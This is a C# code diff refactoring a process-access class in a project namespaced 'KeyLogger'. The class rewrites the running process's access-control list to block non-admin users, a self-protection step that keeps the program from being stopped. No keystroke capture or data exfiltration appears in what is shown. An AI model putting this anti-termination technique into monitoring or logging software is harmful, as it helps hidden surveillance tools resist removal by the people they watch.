@@ -10,13 +10,12 @@ namespace KeyLogger.Services
 {
 	internal class ProcessAccessService
 	{
+		const int DACL_SECURITY_INFORMATION = 0x00000004;
 
 		private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
 		{
-			const int DACL_SECURITY_INFORMATION = 0x00000004;
-			byte[] psd = new byte[0];
-			uint bufSizeNeeded;
-			GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out bufSizeNeeded);
+			var psd = new byte[0];
+			GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out uint bufSizeNeeded);
 			if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
 				throw new Win32Exception();
 			if (!GetKernelObjectSecurity(
@@ -29,22 +28,21 @@ namespace KeyLogger.Services
 			return new RawSecurityDescriptor(psd, 0);
 		}
 
-		private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
-		{
-			const int DACL_SECURITY_INFORMATION = 0x00000004;
-			byte[] rawsd = new byte[dacl.BinaryLength];
-			dacl.GetBinaryForm(rawsd, 0);
+		private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor securityDescriptor)
+		{			
+			var rawsd = new byte[securityDescriptor.BinaryLength];
+			securityDescriptor.GetBinaryForm(rawsd, 0);
 			if (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd))
 				throw new Win32Exception();
 		}
 
 		internal void BlockForNotAdminUsers()
 		{
-			IntPtr hProcess = Process.GetCurrentProcess().Handle;
-			var dacl = GetProcessSecurityDescriptor(hProcess);
+			var hProcess = Process.GetCurrentProcess().Handle;
+			var securityDescriptor = GetProcessSecurityDescriptor(hProcess);
 			var sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;
 
-			dacl.DiscretionaryAcl.InsertAce(
+			securityDescriptor.DiscretionaryAcl.InsertAce(
 				 0,
 				 new CommonAce(
 					  AceFlags.None,
@@ -54,7 +52,7 @@ namespace KeyLogger.Services
 					  false,
 					  null));
 
-			SetProcessSecurityDescriptor(hProcess, dacl);
+			SetProcessSecurityDescriptor(hProcess, securityDescriptor);
 		}
 	}
 }
